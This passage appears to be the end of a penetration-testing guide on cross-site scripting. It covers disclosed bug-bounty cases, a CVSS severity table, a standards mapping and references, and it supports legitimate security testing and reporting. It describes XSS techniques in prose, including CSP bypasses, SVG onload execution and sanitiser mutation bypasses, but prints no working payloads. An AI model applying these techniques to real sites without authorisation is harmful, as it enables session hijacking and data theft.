- **A `javascript:` URL in a React chat client (Valve, 2018).** Steam's chat client accepted BBCode `[url]` tags with arbitrary URLs and rendered them as links in a React client. The reporter pointed out that React's XSS protections did not cover `javascript:` URLs, showed persistent script execution in the client, and argued that the desktop client's web-view could escalate it further. Rated Critical with a USD 7,500 bounty shown on the report; disclosed January 2019. This is the URL-context gap from [URLs that accept any scheme](#urls-that-accept-any-scheme) and test 5. [HackerOne report 409850](https://hackerone.com/reports/409850).
- **Markdown diagram plugin to stored XSS with a CSP bypass (GitLab, 2021).** GitLab's Mermaid configuration let an attacker inject HTML into rendered Markdown; the reporter combined it with a same-origin script (a CI job artifact served from gitlab.com) to get past the CSP. Rated High; disclosed October 2021; tracked as CVE-2021-22242 (insufficient sanitisation in Mermaid Markdown, GitLab 11.4 and later). A plugin generating HTML after the core Markdown parser, and a CSP that trusts its own origin while users can host files on it. [HackerOne report 1212822](https://hackerone.com/reports/1212822), [NVD CVE-2021-22242](https://nvd.nist.gov/vuln/detail/CVE-2021-22242).
- **HTML injection left behind after an XSS fix (GitLab, 2022).** The reporter read the fix for an earlier stored XSS in notes, noticed it removed the script vector but kept the underlying HTML injection in GitLab's syntax-highlighting filter, and turned it into a full stored XSS with a CSP bypass on gitlab.com. Rated High; disclosed May 2022. Why [HTML injection without script](#html-injection-without-script) is reported in its own right. [HackerOne report 1481207](https://hackerone.com/reports/1481207).
- **SVG uploaded as a PNG (GitLab, 2020).** A file attached to a wiki page with a `.png` name but SVG content (an `svg` element with an `onload` handler) executed in the wiki. Rated Medium; disclosed August 2020. Content type decided from what the client claimed rather than from the content (test 11). [HackerOne report 880099](https://hackerone.com/reports/880099).
- **Mutation XSS in DOMPurify (2020).** Michał Bentkowski showed that a serialise-and-reparse round trip could turn a sanitised tree into an executing one, using nested `form` elements and a MathML namespace switch (CVE-2020-26870, fixed in DOMPurify 2.0.17). Gareth Heyes bypassed the patched version weeks later. The reason test 10 starts with the sanitiser's version. [Securitum write-up](https://securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass.html), [PortSwigger Research](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss), [NVD CVE-2020-26870](https://nvd.nist.gov/vuln/detail/CVE-2020-26870).
- **The Samy worm (MySpace, 2005).** A stored XSS in a MySpace profile that copied itself to every profile that viewed it and sent its author friend requests. Samy Kamkar's own timeline shows the count passing one million in under a day. The textbook illustration of why stored XSS on a social surface can be self-propagating, and why this series never uses payloads that act as the victim. [Samy Kamkar's account](https://samy.pl/myspace/).

More write-ups are collected in [Bug Bounty Writeups](/bug-bounty-writeups/).

## Rating findings

Rate on what the script can do in the victim's session and how it reaches the victim, not on how clever the payload was. The factors that move severity: **delivery** (stored and viewed during normal browsing, reflected via a link, needs a POST from an attacker page, needs a lure to a file URL, self-only), **who is hit** (any visitor, other customers, other tenants, staff and administrators), **what the session can do** (read sensitive data, change email or password without re-authentication, create users, move money, administer the platform), **interaction** (none, a click, hover, a key combination), and **what stops it** (a strict CSP that blocks execution, a sandbox domain, `HttpOnly` cookies, which limit cookie theft but not actions).

**Scope and user interaction.** Series convention, which matches the CVSS v3.1 user guide: XSS is scored **Scope Changed** (`S:C`), because the vulnerable component is the web application and the impact lands in the victim's browser session, a different security authority. The FIRST v3.1 examples score a reflected XSS in a WordPress plugin (CVE-2017-5942) as `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` (6.1) and a stored XSS in Cantemo Portal (CVE-2019-7551), where the worst-case victim is an administrator, at 9.0. **User interaction is Required** (`UI:R`) for reflected XSS (the victim follows a link) and normally for stored XSS too (the victim has to open the page), even when no click is needed on the page itself.

| Finding | Typical severity | Example CVSS v3.1 vector | Reasoning |
|---|---|---|---|
| Reflected XSS on a page of an authenticated application (typical) | Medium | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` (6.1) | Anyone can craft the link; the script acts within the victim's session. The FIRST reflected-XSS example |
| Reflected XSS where the session can take over the account (email change without re-authentication, API tokens readable in the page) | High | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` (9.3) | Raise confidentiality and integrity to High when you can show (in prose, against your own account) that one visit leads to full account access |
| Stored XSS by any registered user, viewed by other users | Medium to High | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` (5.4) | Free registration makes `PR:L` a thin barrier; rate High when the page is widely viewed or the victims' sessions are powerful |
| Stored XSS by any user, firing in an administrator's or support agent's browser | High to Critical | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` (8.7) | Admin session can read and change all customers' data and create accounts; the FIRST Cantemo example scores a similar case at 9.0 by adding `A:H` |
| Blind XSS from an unauthenticated channel (contact form, email-to-ticket) firing in a staff tool | High to Critical | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` (9.3) | No account needed; staff sessions reach all customers. Rate on the tool's privileges |
| Stored XSS in a field only administrators can write, viewed by other administrators | Low to Medium | `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N` (4.8) | Higher where admin roles differ (tenant admin attacking platform admin) or admin accounts are numerous |
| Stored XSS via uploaded HTML/SVG on the application origin, victim must open the file URL | Medium | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` (5.4) | A lure is needed, like reflected XSS, but the payload is persistent and hosted on the trusted origin |
| XSS that executes only with a non-default interaction (hover, access-key combination) | Low to Medium | `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N` (4.7) | `AC:H` because success depends on victim behaviour beyond following the link; explain the interaction |
| Injection confirmed but execution blocked by a strict CSP | Low to Medium | `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N` (4.7) | Still a finding: one CSP regression or bypass makes it full XSS. Rate up if the policy has a known weakness |
| HTML injection without script (fake forms, content spoofing, dangling markup) | Low to Medium | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N` (4.3) | Scope Unchanged because no script runs in the victim's browser context; rate higher where a credential-phishing form on the real domain is plausible |
| Self-XSS with no delivery path | Info to Low | none | Requires the victim to paste a payload. Describe what would make it deliverable (CSRF on the field, login CSRF) |
| Self-XSS chained with CSRF on the storing request, shown against your own two accounts | Medium | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` (6.1) | The chain turns it into stored XSS in the victim's account via one visit to an attacker page |
| Sanitiser version with a published bypass, or unmaintained sanitiser (bleach), no working payload | Low | none | Patching item; rate as XSS once you show the vulnerable configuration is reachable |
| Missing `nosniff`, or user data served as `text/html` without demonstrated execution | Info to Low | none | Hardening against `v5.0.0-3.4.4` and `v5.0.0-3.2.1`; rate as XSS if you show execution |

When you report, give: the exact request and parameter or field, the context (and the raw response lines that show it), the characters that came back unencoded, the marker payload and the account and browser you used, where a stored payload renders and for whom, the interaction needed, what CSP was in force and whether it stopped execution, and confirmation that all stored payloads were removed (with the register). State that impact beyond the marker is described, not demonstrated.

## Mapping

| Test | WSTG | ASVS 5.0 | CWE | OWASP Top 10 |
|---|---|---|---|---|
| GT-WEB-XSS-1 | WSTG-INJT-01, WSTG-INJT-02, WSTG-INFO-06 | v5.0.0-1.2.1 (context) | CWE-79 (context) | A05:2025 |
| GT-WEB-XSS-2 | WSTG-INJT-01, WSTG-INJT-02 | v5.0.0-1.2.1, v5.0.0-1.2.3 | CWE-79, CWE-116 | A05:2025 |
| GT-WEB-XSS-3 | WSTG-CLNT-03, WSTG-INJT-01, WSTG-INJT-02 | v5.0.0-1.2.1 | CWE-79, CWE-80, CWE-87 | A05:2025 |
| GT-WEB-XSS-4 | WSTG-INJT-01, WSTG-INJT-02 | v5.0.0-1.2.1, v5.0.0-1.2.3 | CWE-79, CWE-83 | A05:2025 |
| GT-WEB-XSS-5 | WSTG-INJT-01, WSTG-INJT-02 | v5.0.0-1.2.2 | CWE-79, CWE-83, CWE-84 | A05:2025 |
| GT-WEB-XSS-6 | WSTG-INJT-01, WSTG-INJT-02 | v5.0.0-1.2.3, v5.0.0-3.2.2 | CWE-79 | A05:2025 |
| GT-WEB-XSS-7 | WSTG-INJT-01, WSTG-INJT-02, WSTG-CLNT-05 (CSS) | v5.0.0-1.2.1, v5.0.0-1.3.4, v5.0.0-1.3.5 | CWE-79 | A05:2025 |
| GT-WEB-XSS-8 | WSTG-INJT-02 | v5.0.0-1.2.1, v5.0.0-1.3.1 | CWE-79 | A05:2025 |
| GT-WEB-XSS-9 | WSTG-INJT-02 (blind XSS) | v5.0.0-1.2.1 | CWE-79 | A05:2025 |
| GT-WEB-XSS-10 | WSTG-INJT-01, WSTG-INJT-02 (filter analysis) | v5.0.0-1.3.1, v5.0.0-1.3.5 | CWE-79, CWE-87 | A05:2025; A03:2025 for outdated or unmaintained sanitisers |
| GT-WEB-XSS-11 | WSTG-INJT-02 (file uploads) | v5.0.0-3.2.1, v5.0.0-3.4.4, v5.0.0-1.3.4, v5.0.0-5.4.1 | CWE-79 | A05:2025; A02:2025 for missing headers |
| GT-WEB-XSS-12 | WSTG-INJT-01, WSTG-INJT-02 (grey-box) | v5.0.0-1.1.2, v5.0.0-1.2.1, v5.0.0-1.2.3, v5.0.0-3.2.2 | CWE-79, CWE-116 | A05:2025 |

ASVS levels: `v5.0.0-1.2.1` L1 (context-relevant output encoding for HTML, attributes, comments, CSS and headers), `v5.0.0-1.2.2` L1 (URL encoding and safe URL protocols only), `v5.0.0-1.2.3` L1 (encoding when building JavaScript and JSON), `v5.0.0-1.3.1` L1 (WYSIWYG HTML through a well-known sanitiser), `v5.0.0-1.3.4` L2 (SVG sanitised to safe tags and attributes), `v5.0.0-1.3.5` L2 (Markdown, CSS, XSL, BBCode and similar sanitised or disabled), `v5.0.0-1.1.2` L2 (encode as the final step), `v5.0.0-3.2.1` L1 (stop content rendering in the wrong context, for example with `Content-Disposition: attachment` or CSP `sandbox`), `v5.0.0-3.2.2` L1 (text displayed with safe functions such as `textContent`), `v5.0.0-3.4.3` L2 (CSP with `object-src 'none'` and `base-uri 'none'`), `v5.0.0-3.4.4` L2 (`nosniff` on all responses), `v5.0.0-5.4.1` L2 (filenames validated and set in `Content-Disposition`).

CWE choice: **CWE-79** (*Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')*, Base, allowed for mapping) is the default for every finding in this note, including HTML injection. Use a Variant child only when it describes the flaw more precisely: **CWE-80** (*Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)*) for the plain "tags not encoded" case, **CWE-83** (*Improper Neutralization of Script in Attributes in a Web Page*) for attribute and event-handler injection, **CWE-84** (*Improper Neutralization of Encoded URI Schemes in a Web Page*) when an encoded `javascript:` gets past a scheme filter, and **CWE-87** (*Improper Neutralization of Alternate XSS Syntax*) for deny-list filters that miss alternative syntax. MITRE marks all four Variants as allowed for mapping (CWE 4.21 at the time of writing). **CWE-116** (*Improper Encoding or Escaping of Output*, a Class, allowed with review) fits design findings about wrong-context encoding where no specific XSS was shown. Avoid **CWE-692** (*Incomplete Denylist to Cross-Site Scripting*): it is a named chain whose mapping MITRE discourages. `A05:2025` is Injection in the OWASP Top 10:2025; its mapped CWEs include CWE-79, CWE-80, CWE-83, CWE-86 and CWE-116 (CWE-84 and CWE-87 are not on its list, but the finding still belongs in A05). The A02:2025 (Security Misconfiguration) and A03:2025 (Software Supply Chain Failures) references in the table are our reading of where missing headers and outdated components belong; check them against the Top 10 pages for your report. The OWASP API Security Top 10 2023 has no XSS category.

## References

**OWASP**

- WSTG: [Testing for Reflected Cross Site Scripting (WSTG-INJT-01)](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/01-Reflected_Cross_Site_Scripting/), [Testing for Stored Cross Site Scripting (WSTG-INJT-02)](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/02-Stored_Cross_Site_Scripting/), [Testing for HTML Injection (WSTG-CLNT-03)](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/11-Client-side/03-HTML_Injection/), [Testing for DOM-Based Cross Site Scripting (WSTG-CLNT-01)](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/11-Client-side/01-DOM-based_Cross_Site_Scripting/)
- ASVS 5.0: [V1 Encoding and Sanitization](https://github.com/OWASP/ASVS/blob/master/5.0/en/0x10-V1-Encoding-and-Sanitization.md), [V3 Web Frontend Security](https://github.com/OWASP/ASVS/blob/master/5.0/en/0x12-V3-Web-Frontend-Security.md), [V5 File Handling](https://github.com/OWASP/ASVS/blob/master/5.0/en/0x14-V5-File-Handling.md)
- [A05:2025 Injection](https://top10.owasp.org/2025/A05_2025-Injection/)
- Cheat Sheets: [Cross Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), [DOM based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html), [XSS Filter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) (for understanding filter failures; not reproduced here), [Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html), [File Upload](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- Projects: [OWASP Java Encoder](https://github.com/OWASP/owasp-java-encoder), [OWASP Java HTML Sanitizer](https://github.com/OWASP/java-html-sanitizer)

**CWE and CVSS**

- [CWE-79](https://cwe.mitre.org/data/definitions/79.html), [CWE-80](https://cwe.mitre.org/data/definitions/80.html), [CWE-83](https://cwe.mitre.org/data/definitions/83.html), [CWE-84](https://cwe.mitre.org/data/definitions/84.html), [CWE-87](https://cwe.mitre.org/data/definitions/87.html), [CWE-116](https://cwe.mitre.org/data/definitions/116.html)
- FIRST: [CVSS v3.1 User Guide](https://www.first.org/cvss/v3.1/user-guide) (Scope and XSS), [CVSS v3.1 Examples](https://www.first.org/cvss/v3.1/examples)

**PortSwigger**

- [Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting), [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected), [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored), [XSS contexts](https://portswigger.net/web-security/cross-site-scripting/contexts), [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), [Preventing XSS](https://portswigger.net/web-security/cross-site-scripting/preventing), [Dangling markup injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup), [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
- Research: [Exploiting XSS in hidden inputs and meta tags](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags), [Bypassing DOMPurify again with mutation XSS](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
- Burp: [Search](https://portswigger.net/burp/documentation/desktop/tools/search), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator), [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader); BApps [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943), [Reflected Parameters](https://portswigger.net/bappstore/8e8f6bb313db46ba9e0a7539d3726651), [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100)

**Sanitisers and Markdown**

- [DOMPurify](https://github.com/cure53/DOMPurify) ([security advisories](https://github.com/cure53/DOMPurify/security), [releases](https://github.com/cure53/DOMPurify/releases))
- [sanitize-html](https://github.com/apostrophecms/apostrophe/tree/main/packages/sanitize-html)
- [nh3](https://nh3.readthedocs.io/en/latest/) ([GitHub](https://github.com/messense/nh3)), [ammonia](https://github.com/rust-ammonia/ammonia)
- bleach: [repository](https://github.com/mozilla/bleach), [deprecation statement (issue 698)](https://github.com/mozilla/bleach/issues/698)
- [HTMLPurifier](http://htmlpurifier.org/) ([GitHub](https://github.com/ezyang/htmlpurifier))
- [marked](https://marked.js.org/), [markdown-it](https://github.com/markdown-it/markdown-it) ([safety](https://github.com/markdown-it/markdown-it/blob/master/docs/safety.md))
- Mutation XSS: [Securitum, Mutation XSS via namespace confusion (DOMPurify 2.0.17 bypass)](https://securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass.html); NVD [CVE-2020-26870](https://nvd.nist.gov/vuln/detail/CVE-2020-26870), [CVE-2024-47875](https://nvd.nist.gov/vuln/detail/CVE-2024-47875), [CVE-2025-26791](https://nvd.nist.gov/vuln/detail/CVE-2025-26791), [CVE-2021-23980](https://nvd.nist.gov/vuln/detail/CVE-2021-23980)

**Framework documentation**

- React: [Common components (`dangerouslySetInnerHTML`)](https://react.dev/reference/react-dom/components/common), [React 16.9 release notes (deprecating `javascript:` URLs)](https://legacy.reactjs.org/blog/2019/08/08/react-v16.9.0.html)
- Angular: [Security](https://angular.dev/best-practices/security), [DomSanitizer](https://angular.dev/api/platform-browser/DomSanitizer)
- Vue: [Security](https://vuejs.org/guide/best-practices/security.html), [Built-in directives (`v-html`)](https://vuejs.org/api/built-in-directives.html)
- Django: [Security in Django](https://docs.djangoproject.com/en/stable/topics/security/), [Built-in template tags and filters](https://docs.djangoproject.com/en/stable/ref/templates/builtins/) (`json_script`, `safe`, `autoescape`), [django.utils.html](https://docs.djangoproject.com/en/stable/ref/utils/) (`format_html`, `mark_safe`), [Content Security Policy](https://docs.djangoproject.com/en/stable/ref/csp/), [Settings](https://docs.djangoproject.com/en/stable/ref/settings/) (`SECURE_CONTENT_TYPE_NOSNIFF`)
- Jinja2 and Flask: [Jinja API (autoescaping)](https://jinja.palletsprojects.com/en/stable/api/), [Template Designer Documentation (`tojson`, `safe`)](https://jinja.palletsprojects.com/en/stable/templates/), [Flask templating](https://flask.palletsprojects.com/en/stable/templating/)
- Thymeleaf: [Using Thymeleaf 3.1](https://www.thymeleaf.org/doc/tutorials/3.1/usingthymeleaf.html) (`th:text`, `th:utext`, JavaScript inlining); Spring Security: [Security HTTP response headers](https://docs.spring.io/spring-security/reference/features/exploits/headers.html)
- Laravel: [Blade templates](https://laravel.com/docs/13.x/blade) (displaying unescaped data, `Js::from`)
- Rails: [Securing Rails applications](https://guides.rubyonrails.org/security.html), [Active Support core extensions (`html_safe`, `raw`)](https://guides.rubyonrails.org/active_support_core_extensions.html), [SanitizeHelper](https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html)
- Express and engines: [Using template engines with Express](https://expressjs.com/en/guide/using-template-engines.html), [EJS](https://ejs.co/), [Pug interpolation](https://pugjs.org/language/interpolation.html), [Handlebars expressions](https://handlebarsjs.com/guide/expressions.html), [helmet](https://github.com/helmetjs/helmet)
- MDN: [X-Content-Type-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Content-Type-Options), [Content-Disposition](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Disposition), [Trusted Types API](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API), [HTML Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API)

**Tools**

- [interactsh](https://github.com/projectdiscovery/interactsh); [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express) (cited for what such tools capture by default)
- Static analysis: CodeQL [js/reflected-xss](https://codeql.github.com/codeql-query-help/javascript/js-reflected-xss/), [js/stored-xss](https://codeql.github.com/codeql-query-help/javascript/js-stored-xss/), [py/reflective-xss](https://codeql.github.com/codeql-query-help/python/py-reflective-xss/), [java/xss](https://codeql.github.com/codeql-query-help/java/java-xss/); Semgrep [Django XSS cheat sheet](https://semgrep.dev/docs/cheat-sheets/django-xss); ESLint [react/no-danger](https://github.com/jsx-eslint/eslint-plugin-react/blob/master/docs/rules/no-danger.md), [vue/no-v-html](https://eslint.vuejs.org/rules/no-v-html.html)
- Labs: [OWASP Juice Shop](https://github.com/juice-shop/juice-shop), [PortSwigger Web Security Academy](https://portswigger.net/web-security)
